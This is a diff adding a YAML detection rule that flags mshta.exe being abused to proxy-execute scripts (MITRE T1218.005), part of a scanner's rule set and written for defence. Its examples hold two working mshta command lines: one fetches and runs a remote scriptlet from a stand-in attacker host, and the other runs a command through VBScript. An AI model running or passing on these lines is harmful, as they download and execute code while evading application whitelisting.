@@ -1,0 +1,33 @@
+# PowerShell Pattern: MSHTA LOLBin Abuse
+# Detects mshta.exe usage for code execution
+
+id: PS-022
+name: MSHTA LOLBin Abuse
+description: |
+  Detects abuse of mshta.exe as a Living Off The Land Binary for executing
+  malicious code, scripts, or HTA applications. MSHTA can execute JavaScript,
+  VBScript, and download/execute remote payloads while bypassing application
+  whitelisting.
+languages:
+  - powershell
+detection_type: regex
+detection_logic: '(?i)mshta(?:\.exe)?.*(?:javascript:|vbscript:|http://|https://|\.hta|\.sct)'
+severity: High
+mitre_technique: T1218.005
+confidence: 0.90
+category: defense_evasion
+enabled: true
+metadata:
+  author: Script Sentinel Team
+  created: "2025-01-19"
+  references:
+    - "https://attack.mitre.org/techniques/T1218/005/"
+    - "https://lolbas-project.github.io/lolbas/Binaries/Mshta/"
+  tags:
+    - lolbin
+    - mshta
+    - code-execution
+    - defense-evasion
+  examples:
+    - "mshta.exe javascript:a=GetObject(\"script:http://attacker.com/payload.sct\").Exec();close();"
+    - "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"calc\"\", 0 : window.close\")"
